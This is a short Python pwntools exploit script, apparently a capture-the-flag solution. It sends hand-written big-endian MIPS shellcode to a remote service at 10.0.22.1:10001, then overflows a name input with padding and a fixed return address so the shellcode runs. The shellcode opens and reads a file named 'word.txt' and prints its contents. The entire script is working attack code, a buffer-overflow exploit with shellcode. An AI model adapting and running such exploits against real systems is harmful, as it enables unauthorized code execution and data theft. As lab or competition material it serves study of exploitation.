#!/usr/bin/env python

# by Sean

from pwn import *

context.arch='mips'
context.endian='big'
s = asm('''
        sub $sp, 0x100
        li $v0, 0x776f7264
        sw $v0, 0($sp)
        li $v0, 0x2e747874
        sw $v0, 4($sp)
        li $v0, 0
        sw $v0, 8($sp)

        move $a0, $sp
        li $a1, 0
        li $a2, 0x1a4
        li $t9, 2
        .word 0x7000007F

        move $a0, $v0
        add $a1, $sp, 64
        li $a2, 100
        li $t9, 4
        .word 0x7000007F

        add $a0, $sp, 64
        li $t9, 0x800000fc
        jalr $t9
        nop

''')

print 'size =', len(s)
print disasm(s)

r = remote('10.0.22.1', 10001)
#r = remote('127.0.0.1', 10001)

context.log_level = 0

r.recvuntil('Push Enter: ')
r.send(s + '\n')

r.recvuntil('Input name: ')

r.send('A'*20 + p32(0x80000708) + '\n')


r.interactive()
